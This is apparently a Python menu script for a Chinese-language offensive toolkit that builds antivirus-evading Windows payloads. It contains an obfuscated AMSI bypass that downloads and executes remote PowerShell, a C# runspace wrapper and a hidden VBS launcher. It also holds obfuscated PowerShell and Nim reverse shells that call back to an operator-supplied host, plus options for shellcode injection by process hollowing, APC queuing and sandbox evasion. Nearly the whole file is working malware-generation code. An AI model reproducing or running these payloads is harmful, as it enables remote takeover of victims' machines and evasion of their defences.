

import base64
from email.mime import base
from importlib.resources import path
import sys, os
from time import sleep


raw_stub = """
                      ___   _   _       _      ____
 |_ _| | \ | | ___ | |_   / ___|_ __ ___  ___ _ __
  | |  |  \| |/ _ \| __| | |  _| '__/ _ \/ _ \ '_ \
  | |  | |\  | (_) | |_  | |_| | | |  __/  __/ | | |
 |___| |_| \_|\___/ \__|  \____|_|  \___|\___|_| |_|

usage: loader.py [-h] [-p explorer.exe] [-m QueueUserAPC] [-nr] [-v] [-d] [-o Green.exe] file

基于syswhispers的shellcode加载器
positional arguments:
  file                  包含raw格式的shellcode格式文件

optional arguments:
  -h, --help            show this help message and exit
  -p explorer.exe, --process explorer.exe
                        注入的进程(默认: explorer.exe)
  -m QueueUserAPC, --method QueueUserAPC
                        shellcode注入模式(Options: ProcessHollow, QueueUserAPC, RemoteThreadContext,
                        RemoteThreadSuspended, CurrentThread) (默认: QueueUserAPC)
  -nr, --no-randomize   禁用系统调用名称随机化
  -v, --verbose         执行时启用调试消息
  -d, --dll-sandbox     通过加载的 DLL 枚举逃避沙箱
  -o Green.exe, --outfile Green.exe
                        编译文件名
"""

graphical = """
####    ##    ##  #######  ########     ######   ########  ######## ######## ##    ## 
 ##     ###   ## ##     ##    ##       ##    ##  ##     ## ##       ##       ###   ## 
 ##     ####  ## ##     ##    ##       ##        ##     ## ##       ##       ####  ## 
 ##     ## ## ## ##     ##    ##       ##   #### ########  ######   ######   ## ## ## 
 ##     ##  #### ##     ##    ##       ##    ##  ##   ##   ##       ##       ##  #### 
 ##     ##   ### ##     ##    ##       ##    ##  ##    ##  ##       ##       ##   ### 
####    ##    ##  #######     ##        ######   ##     ## ######## ######## ##    ## 

"""
Option_stub = """
.------..------..------..------.     .------..------..------..------..------..------..------.
|M.--. ||O.--. ||R.--. ||E.--. |.-.  |O.--. ||P.--. ||T.--. ||I.--. ||O.--. ||N.--. ||S.--. |
| (\/) || :/\: || :(): || (\/) ((5)) | :/\: || :/\: || :/\: || (\/) || :/\: || :(): || :/\: |
| :\/: || :\/: || ()() || :\/: |'-.-.| :\/: || (__) || (__) || :\/: || :\/: || ()() || :\/: |
| '--'M|| '--'O|| '--'R|| '--'E| ((1)) '--'O|| '--'P|| '--'T|| '--'I|| '--'O|| '--'N|| '--'S|
`------'`------'`------'`------'  '-'`------'`------'`------'`------'`------'`------'`------'
 bilibli:我不是格林
 Github:https://github.com/INotGreen/Gllllnimloader
 
 1.免杀加载器(Bypass Loader)
 2.文件格式转换(File Format Conversion)
 3.免杀套接字(Bypass Socket)
"""
stub = """
using System;
using System.Management.Automation.Runspaces;
using System.Text;
using System.Runtime.InteropServices;

public class AmsiBypass
{
    
    static void Main(string[] args)
    {
        byte[] psrevshell = Convert.FromBase64String("RETURN_CSHARP");
        string decodedString = Encoding.UTF8.GetString(psrevshell);
        Runspace rs = RunspaceFactory.CreateRunspace();
        rs.Open();
        Pipeline pipeline = rs.CreatePipeline();
        pipeline.Commands.AddScript(decodedString);
        pipeline.Invoke();
        rs.Close();
        
    }
}
"""
PowerShell_stub = """
Set-Variable -Name w -Value ('System.Management.Automation.A');Set-Variable -Name c -Value ('si');Set-Variable -Name m -Value ('Utils');Set-Variable -Name assembly -Value ([Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m)));Set-Variable -Name field -Value ($assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static'));$field.SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString("GREEN")
"""

powershell_to_vbs = """

<#Add-Type -AssemblyName System.Windows.Forms
<#$FileBrowser = New-Object System.Windows.Forms.OpenFileDialog -Property @{ 
    InitialDirectory = [Environment]::GetFolderPath('Desktop') 
    Filter = 'PS1 Scripts (*.ps1)|*.ps1'
}
$null = $FileBrowser.ShowDialog()

[System.Windows.MessageBox]::Show($FileBrowser.Filename)
$parent = Split-Path $FileBrowser.Filename -parent
[System.Windows.MessageBox]::Show($parent)
$child = $FileBrowser.SafeFileName#>

$text = [IO.File]::ReadAllText("stubps1tovbs.ps1")
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$encoded = [Convert]::ToBase64String($bytes)

New-Item  -Name "Green.vbs" -ItemType "file" -Value "Set objShell = CreateObject(""Wscript.Shell"")`nobjShell.Run(""powershell -sta -NoExit -WindowStyle Hidden -EncodedCommand """"$encoded""""""),vbhide"
"""
Loading_method = """
1.Automation的加载方式(无图标)
d8888          888                                    888    d8b                   
      d88888          888                                    888    Y8P                   
     d88P888          888                                    888                          
    d88P 888 888  888 888888  .d88b.  88888b.d88b.   8888b.  888888 888  .d88b.  88888b.  
   d88P  888 888  888 888    d88""88b 888 "888 "88b     "88b 888    888 d88""88b 888 "88b 
  d88P   888 888  888 888    888  888 888  888  888 .d888888 888    888 888  888 888  888 
 d8888888888 Y88b 888 Y88b.  Y88..88P 888  888  888 888  888 Y88b.  888 Y88..88P 888  888 
d88P     888  "Y88888  "Y888  "Y88P"  888  888  888 "Y888888  "Y888 888  "Y88P"  888  888 
               
2.PSTOEXE的加载方式(有图标)
8888888b.               88888888888           8888888888                            
888   Y88b                  888               888                                   
888    888                  888               888                                   
888   d88P .d8888b          888   .d88b.      8888888    888  888  .d88b.   .d8888b 
8888888P"  88K              888  d88""88b     888        `Y8bd8P' d8P  Y8b d88P"    
888        "Y8888b.         888  888  888     888          X88K   88888888 888      
888             X88         888  Y88..88P     888        .d8""8b. Y8b.     Y88b.    
888         88888P'         888   "Y88P"      8888888888 888  888  "Y8888   "Y8888P                                                                                                                                                                                                                                                   
"""

nim_socket = """
import net
import osproc
import os
var ip = "IPREPLACE" 
var port = PORTREPLACE
var socket = newSocket()
var finalcommand : string
while true:
    try:
        socket.connect(ip,Port(port)) 
        while true:            
            try:
                socket.send("<nimshell>")
                var command = socket.recvLine() 
                if command == "bye":
                    socket.send("退出 NIM SHELL ")
                    socket.close()
                    system.quit(0)
                if  system.hostOS == "windows":
                    finalcommand = "cmd /C" & command
                else:
                    finalcommand = "/bin/sh -c" & command
                var (cmdres, _) = execCmdEx(finalcommand)
                socket.send(cmdres) 
            except:
                socket.close()
                system.quit(0)
    except:
        echo "连接失败，5秒后尝试"
        sleep(5000)
        continue
"""
raw_stub = """
                 
特征:
+----------+----+--------------------------+--------+---+ 
|1.系统调用名动态随机化                                  |   
*                                                       *
|2.添加花指令规避静态检测                                |
*                                                       *
|3.通过超长睡眠规避沙箱检测                              |
*                                                       * 
|4.执行时启用反调试信息                                  |   
*                                                       * 
|5.父进程欺骗                                           |
*                                                       *
|6.具有动态生成的XOR密钥                                 |                                           
+----------+----+--------------------------+--------+---+                                            

进程注入模式：
+----------+----+--------------------------+--------+--- +
|1.processhollowing                                      |                
*                                                        *
|2.QueueUserAPC                                          |   
*                                                        *   
|3.RemoteThreadContext                                   |    
*                                                        *   
|4.RemoteThreadSuspended                                 |
*                                                        *
|5.CurrentThread                                         |   
+----------+----+--------------------------+--------+----+\n
"""
PowerShell_Socket = """
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient("IPREPLACE",PORTREPLACE));
&('sV')  ("{0}{1}" -f 'p','w4c')  (  [tYPE]("{1}{3}{2}{0}"-f 'nG','TE',("{1}{2}{0}" -f 'i','En','cOd'),'Xt.') ) ;&("{0}{2}{1}{3}" -f("{0}{1}" -f'Set','-'),'b',("{1}{0}"-f'aria','V'),'le') -Value (${C`L`IEnT}.("{1}{2}{0}" -f 'am',("{0}{1}" -f'G','etS'),'tre')."i`N`VoKe"()) -Name ("{0}{1}{2}" -f 's',("{0}{1}"-f'tr','ea'),'m');[byte[]]${b`Yt`es} = 0..65535|&('%'){0};while((.("{0}{2}{3}{1}" -f'S',("{0}{1}" -f'i','able'),'et',("{0}{1}" -f '-','Var')) -Name ('i') -Value (${s`T`Ream}.("{0}{1}"-f'Rea','d')."IN`Voke"(${b`Y`TES}, 0, ${By`Tes}."LeNg`TH"))) -ne 0){;&("{2}{0}{1}" -f'Va',("{0}{1}"-f 'ria','ble'),("{1}{0}"-f 't-','Se')) -Name ("{1}{0}"-f 'ta','da') -Value ((&("{2}{1}{0}" -f 'ect',("{0}{1}"-f'w-','Obj'),'Ne') -TypeName ("{4}{2}{1}{0}{5}{3}" -f'IEn','I',("{1}{0}{2}" -f'.','xt','ASC'),("{1}{0}"-f 'ding','o'),("{1}{2}{0}" -f'e','Sys','tem.T'),'c'))."g`e`TSTRiNg"(${bYT`Es},0, ${I}));.("{1}{2}{0}{3}"-f'i','Se',("{1}{0}"-f'r','t-Va'),("{1}{0}" -f 'ble','a')) -Value (.("{0}{1}"-f'ie','x') ${D`ATA} 2>&1 | .("{1}{2}{0}"-f'g','Ou',("{0}{1}"-f't-Stri','n')) ) -Name ("{0}{1}" -f ("{1}{2}{0}"-f 'c','se','ndba'),'k');.("{0}{3}{1}{2}" -f'Se',("{0}{1}"-f 'Va','riabl'),'e','t-') -Value (${sE`NDBack} + "PS " + (.("{0}{1}" -f'p','wd'))."P`ATH" + "> ") -Name ("{0}{1}"-f'se',("{0}{2}{1}"-f'n','ack2','db'));&("{1}{2}{3}{0}"-f 'le',("{0}{1}"-f 'Set-','Va'),'ri','ab') -Name ("{1}{0}"-f ("{0}{1}"-f'ndbyt','e'),'se') -Value (( (  .("{0}{1}" -f'i','tEm') ("{4}{2}{1}{0}{3}"-f'W4','Ble:p','IA','C','vaR')  )."vAL`UE"::"Asc`II").("{0}{1}" -f("{0}{1}"-f 'Get','By'),'tes')."in`VOKE"(${SEN`D`BAck2}));${str`eam}.("{0}{1}" -f'Wri','te')."InV`OKE"(${S`en`D`BYTE},0,${SeN`D`ByTe}."lE`NGtH");${ST`R`EaM}.("{0}{1}" -f ("{0}{1}"-f'F','lus'),'h')."IN`V`oKe"()};${cl`I`eNT}.("{0}{1}" -f'C',("{0}{1}"-f 'los','e'))."I`N`Voke"()
"""
powershell_stub = """
IEX (New-Object Net.WebClient).DownloadString("return_csharp")
"""
def main(powershell_to_vbs,PowerShell_stub, stub, raw_stub,nim_socket,PowerShell_Socket,powershell_stub, verbose):
    
    #print(stub)
    while True:
        print(Option_stub)
        Options = input("<INOTGREEN>:")
        if Options == "1":
            while True:
                #print()
                print("请选择下列shellcode加载器:\n"
                      "1.C/C++ ShellCode(bin)\n"
                      "2.C# ShellCode loader\n"
                      "3.PowerShell Loader\n"
                      )
                Bypass_choice = input("<INOTGREEN>:")
                if Bypass_choice == "back":
                    break
                if Bypass_choice == "1": #C/C++系统调用加载器
                    print(raw_stub)
                    Inject_Module = input("请输入进程注入模式:\n"
                    "<INOTGREEN>:"
                    ) 
                    print("\n")
                    file = input("请输入raw格式的文件:\n"   
                    "<INETGREEN>:"
                    )
                    print("\n")
                    if Inject_Module in["1", "processhollow"]:
                        os.system("powershell python.exe .\loader.py .\{} -p explorer.exe -m processhollow".format(file))
                    if Inject_Module in["2", "QueueUserAPC", "queueUserapc"]:
                        os.system("powershell python.exe .\loader.py .\{} -p explorer.exe -m queueUserapc".format(file))
                    if Inject_Module in["3", "RemoteThreadContext", "remotethreadcontext"]:
                        os.system("powershell python.exe .\loader.py .\{} -p explorer.exe -m remotethreadcontext".format(file))
                    if Inject_Module in["4", "RemoteThreadSuspended", "remoteThreadsuspended"]:
                        os.system("powershell python.exe .\loader.py .\{} -p explorer.exe -m remoteThreadsuspended".format(file))
                    if Inject_Module in["5", "CurrentThread", "currentthread"]:
                        os.system("powershell python.exe .\loader.py .\{} -p explorer.exe -m currentthread".format(file))
                    break
                if Bypass_choice == "2":
                    print(graphical)
                    
                    url = input("请输入网址：\n"
                    "<INOTGREEN>") 

                    print("1.DotNet4.0\n(适用于win10、winserver2016以上的版本)\n"
                    "\n"
                    "2.DotNet2.0(适用于win10、winserver2016以下的版本)\n")
                    Banner_dotnet = input("请选择C#.NET版本:\n""<INOTGREEN>")
                    if Banner_dotnet == "1":
                        PowerShell_stub = PowerShell_stub.replace("GREEN", url)
                        #print(PowerShell_stub)
                        PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
                        stub = stub.replace("RETURN_CSHARP", PowerShell_stubEncryption)
                        writefile = open("stub.cs", "w")
                        writefile.write(stub)
                        writefile.close()
                        try:
                            os.system("C:\\Windows\Microsoft.NET\\Framework\\v4.0.30319\csc.exe /reference:C:\\WINDOWS\Microsoft.Net\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /target:winexe /win32icon:demo.ico .\stub.cs")
                        except:
                            break
                    if Banner_dotnet == "2":
                        powershell_stub = powershell_stub.replace("return_csharp", url)
                        powershell_stub = base64.b64encode(powershell_stub.encode('utf-8')).decode("utf-8")
                        stub = stub.replace("RETURN_CSHARP", powershell_stub)
                        writefile = open("stub.cs", "w")
                        writefile.write(stub)
                        writefile.close()
                        try:
                            os.system("C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\csc /reference:C:\\Windows\\assembly\\GAC_MSIL\\System.Management.Automation\\1.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll /target:winexe .\stub.cs")
                        except:
                            break
                    os.system("del stub.cs")
                if Bypass_choice == "3":
                    while True:
                        print(graphical)
                        url = input("请输入网址：")        
                        PowerShell_stub = PowerShell_stub.replace("GREEN", url)
                        #print(PowerShell_stub)
                        PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
                        stub = stub.replace("REPLACED", PowerShell_stubEncryption)
                
                        print("[+] 启用详细消息")
                        writefile = open("Stub.ps1", "w")
                        writefile.write(stub)
                        writefile.close()
                        sleep(1)
                        print("[+] 将新存根保存到 Stub.ps1")
                        sleep(1)
                        print("[+] 编译新存根...")
                        os.system(
                              "powershell .\PSTOEXE.ps1 -inputFile 'Stub.ps1' -iconFile .\demo.ico -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS")
                        os.system("del Stub.ps1")
                        break
        if Options == "2":
            while True:
                print("1.ps1_to_vbs\n"
                  
                  "2.ps1_to_exe\n")
                formatopions = input("<INOTGREEN>:")
                if formatopions == "1":
                    url = input("请输入网址：\n"
                    "<INOTGREEN>:")        
                    PowerShell_stub = PowerShell_stub.replace("GREEN", url)
                    #print(PowerShell_stub)
                    PowerShell_stubEncryption = base64.b64encode(PowerShell_stub.encode('utf-8')).decode("utf-8")     
                    stub = stub.replace("REPLACED", PowerShell_stubEncryption)
                    print("[+] 启用详细消息")
                    os.system("del Green.vbs")
                    writefile = open("stubps1tovbs.ps1", "w")
                    writefile.write(PowerShell_stub)
                    writefile.close()
                    Ps1ToVbs = open("Ps1ToVbs.ps1", "w")
                    Ps1ToVbs.write(powershell_to_vbs)
                    Ps1ToVbs.close()
                    sleep(1)
                    print("[+] 将新存根保存到 stubps1tovbs.ps1.ps1")
                    sleep(1)
                    os.system("powershell .\Ps1ToVbs.ps1")
                    os.system("del Ps1ToVbs.ps1")
                    os.system("del stubps1tovbs.ps1")
                if formatopions == "2":
                    Path = input("请输入文件路径:\n"
                    "<INOTEGREE>:")
                    Icon = input("请输入图标路径:\n"
                    "<INOTGREEN>:")
                    os.system("powershell .\PSTOEXE.ps1 -inputFile '{0}' -iconFile {1} -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(Path, Icon))
                if formatopions == "back":
                    print(Option_stub)
                    break
                else:
                    print("输入内容有错误，请重新输入")
                    pass
        #if Options == "3":
        #if Options == "4":   
        if Options == "3":
            while True:
                print("1.Powershell\n"
                
                "2.Nim Lang\n"
                )
                socketchoice = input("请输入套接字选项\n"
                "<INOTGREEN>:")
                if socketchoice == "2":
                    ip = input("请输入IP地址(域名)\n"
                    "<INOTGREEN>:")
                    port = input("请输入回连端口\n"
                    "<INOTGREEN>:")
                    nim_socket = nim_socket.replace("IPREPLACE",ip)
                    nim_socket = nim_socket.replace("PORTREPLACE",port)

                    Nim_Socket = open("Nim_Socket.nim","w")
                    Nim_Socket.write(nim_socket)
                    Nim_Socket.close()
                    try:
                        print("[+] 启用详细消息")
                        sleep(1)
                        print("[+] 将新存根保存到 Nim_Socket.nim")
                        sleep(1)
                        os.system("nim c --hints:off --warnings:off -d:danger -d:mingw --app:gui Nim_Socket.nim")
                        os.system("del Nim_Socket.nim")
                        break
                    except:
                        print("[!]编译失败")
                        pass

                if socketchoice == "1":
                    ip = input("请输入IP地址(域名)\n"
                    "<INOTGREEN>:")
                    port = input("请输入回连端口\n"
                    "<INOTGREEN>:")
                    PowerShell_Socket = PowerShell_Socket.replace("IPREPLACE", ip)
                    PowerShell_Socket = PowerShell_Socket.replace("PORTREPLACE", port)

                    ps_stub = open("PowerShell_Socket.ps1","w")
                    ps_stub.write(PowerShell_Socket)
                    ps_stub.close()
                    try:
                        Icon = input("请输入图标路径:\n"
                        "<INOTGREEN>:")
                        print("[+] 启用详细消息")
                        sleep(1)
                        print("[+] 将新存根保存到 PowerShell_Socket.ps1")
                        sleep(1)
                        os.system(
                                "powershell .\PSTOEXE.ps1 -inputFile 'PowerShell_Socket.ps1' -iconFile {} -outputFile 'Stub.exe' -runtime40 -lcid '' -MTA -noConsole -supportOS".format(
                                    Icon))
                        os.system("del PowerShell_Socket.ps1")
                    except:
                        print("[!]编译失败")
                        pass
                #if socketchoice == "2"


        #if Options == "6": 
        else:
            sleep(1.9)
            print(Option_stub)
main(powershell_to_vbs, PowerShell_stub, stub, raw_stub, nim_socket, PowerShell_Socket, powershell_stub,verbose=True)
















